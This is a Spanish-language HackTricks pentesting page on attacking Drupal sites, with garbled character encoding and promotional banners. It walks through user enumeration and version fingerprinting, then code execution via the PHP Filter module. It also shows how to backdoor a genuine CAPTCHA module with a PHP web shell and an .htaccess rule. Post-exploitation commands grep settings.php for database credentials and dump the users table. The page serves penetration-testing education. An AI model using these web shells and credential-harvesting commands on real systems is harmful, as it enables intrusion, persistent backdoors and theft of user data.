# Drupal

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Descubrimiento

* Verifica **meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Nodo**: Drupal **indexa su contenido utilizando nodos**. Un nodo puede **contener cualquier cosa** como una publicaciÃ³n de blog, encuesta, artÃ­culo, etc. Las URIs de pÃ¡gina suelen tener la forma `/node/<nodeid>`.
```bash
curl drupal-site.com/node/1
```
## EnumeraciÃ³n

Drupal admite **tres tipos de usuarios** de forma predeterminada:

1. **`Administrador`**: Este usuario tiene control completo sobre el sitio web de Drupal.
2. **`Usuario autenticado`**: Estos usuarios pueden iniciar sesiÃ³n en el sitio web y realizar operaciones como agregar y editar artÃ­culos segÃºn sus permisos.
3. **`AnÃ³nimo`**: Todos los visitantes del sitio web se designan como anÃ³nimos. Por defecto, a estos usuarios solo se les permite leer publicaciones.

### VersiÃ³n

* Verificar `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Las instalaciones mÃ¡s recientes de Drupal por defecto bloquean el acceso a los archivos `CHANGELOG.txt` y `README.txt`.
{% endhint %}

### EnumeraciÃ³n de nombres de usuario

#### Registro

En _/user/register_ simplemente intenta crear un nombre de usuario y si el nombre ya estÃ¡ tomado, se notificarÃ¡:

![](<../../.gitbook/assets/image (254).png>)

#### Solicitar nueva contraseÃ±a

Si solicitas una nueva contraseÃ±a para un nombre de usuario existente:

![](<../../.gitbook/assets/image (255).png>)

Si solicitas una nueva contraseÃ±a para un nombre de usuario que no existe:

![](<../../.gitbook/assets/image (256).png>)

### Obtener nÃºmero de usuarios

Accediendo a _/user/\<number>_ puedes ver el nÃºmero de usuarios existentes, en este caso es 2 ya que _/users/3_ devuelve un error de no encontrado:

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### PÃ¡ginas ocultas

**Fuzz `/node/$` donde `$` es un nÃºmero** (del 1 al 500, por ejemplo).\
PodrÃ­as encontrar **pÃ¡ginas ocultas** (de prueba, desarrollo) que no estÃ¡n referenciadas por los motores de bÃºsqueda.

#### InformaciÃ³n de los mÃ³dulos instalados
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### AutomÃ¡tico
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### Con el mÃ³dulo PHP Filter

{% hint style="warning" %}
En versiones antiguas de Drupal **(antes de la versiÃ³n 8)**, era posible iniciar sesiÃ³n como administrador y **habilitar el mÃ³dulo `PHP filter`**, que "permite evaluar fragmentos de cÃ³digo PHP incrustados".
{% endhint %}

Necesitas que el **plugin php estÃ© instalado** (verifica accediendo a _/modules/php_ y si devuelve un **403**, entonces **existe**, si **no se encuentra**, entonces **el plugin php no estÃ¡ instalado**)

Ve a _MÃ³dulos_ -> (**Verifica**) _PHP Filter_ -> _Guardar configuraciÃ³n_

![](<../../.gitbook/assets/image (247) (1).png>)

Luego haz clic en _Agregar contenido_ -> Selecciona _PÃ¡gina bÃ¡sica_ o _ArtÃ­culo_ -> Escribe _cÃ³digo shell php en el cuerpo_ -> Selecciona _CÃ³digo PHP_ en _Formato de texto_ -> Selecciona _Vista previa_

![](<../../.gitbook/assets/image (253) (1).png>)

Finalmente, solo accede al nodo reciÃ©n creado:
```bash
curl http://drupal-site.local/node/3
```
### Instalar el MÃ³dulo de Filtro PHP

A partir de la versiÃ³n **8 en adelante, el** [**MÃ³dulo de Filtro PHP**](https://www.drupal.org/project/php/releases/8.x-1.1) **no se instala por defecto**. Para aprovechar esta funcionalidad, tendrÃ­amos que **instalar el mÃ³dulo nosotros mismos**.

1. Descargue la versiÃ³n mÃ¡s reciente del mÃ³dulo desde el sitio web de Drupal.
   1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Una vez descargado, vaya a **`AdministraciÃ³n`** > **`Informes`** > **`Actualizaciones disponibles`**.
3. Haga clic en **`Examinar`**`,` seleccione el archivo del directorio donde lo descargamos y luego haga clic en **`Instalar`**.
4. Una vez instalado el mÃ³dulo, podemos hacer clic en **`Contenido`** y **crear una nueva pÃ¡gina bÃ¡sica**, similar a como lo hicimos en el ejemplo de Drupal 7. Nuevamente, asegÃºrese de **seleccionar `CÃ³digo PHP` desde el menÃº desplegable `Formato de texto`**.

### MÃ³dulo con Puerta Trasera

Un mÃ³dulo con puerta trasera se puede crear **agregando una shell a un mÃ³dulo existente**. Los mÃ³dulos se pueden encontrar en el sitio web drupal.org. Elija un mÃ³dulo como [CAPTCHA](https://www.drupal.org/project/captcha). DesplÃ¡cese hacia abajo y copie el enlace para el archivo tar.gz [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Descargue el archivo y extraiga su contenido.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Crear una **shell web PHP** con el contenido:
```php
<?php
system($_GET["cmd"]);
?>
```
* A continuaciÃ³n, necesitamos crear un archivo **`.htaccess`** para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la carpeta **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* La configuraciÃ³n anterior aplicarÃ¡ reglas para la carpeta / cuando solicitemos un archivo en /modules. Copie ambos archivos a la carpeta captcha y cree un archivo comprimido.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Suponiendo que tenemos **acceso administrativo** al sitio web, haga clic en **`Administrar`** y luego en **`Extender`** en la barra lateral. A continuaciÃ³n, haga clic en el botÃ³n **`+ Instalar nuevo mÃ³dulo`**, y se nos llevarÃ¡ a la pÃ¡gina de instalaciÃ³n, como `http://drupal-site.local/admin/modules/install`. Busque el archivo de Captcha con puerta trasera y haga clic en **`Instalar`**.
* Una vez que la instalaciÃ³n tenga Ã©xito, navegue hasta **`/modules/captcha/shell.php`** para ejecutar comandos.

## Post ExplotaciÃ³n

### Leer settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### Volcar usuarios de la base de datos
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## Referencias

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme en** **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**hacktricks**](https://github.com/carlospolop/hacktricks) **y** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
